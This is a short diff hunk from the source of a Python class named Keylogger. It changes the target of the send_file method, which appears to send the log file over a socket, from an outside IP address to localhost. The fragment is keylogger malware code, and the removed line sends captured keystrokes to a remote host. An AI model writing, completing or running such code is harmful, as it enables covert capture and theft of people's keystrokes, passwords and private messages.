@@ -41,7 +41,7 @@ class Keylogger:
     
     def send_file(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('140.113.168.197', 12345))
+        s.connect(('127.0.0.1', 12345))
         print('socket connected')
 
         with open(self.filename, 'rb') as f:
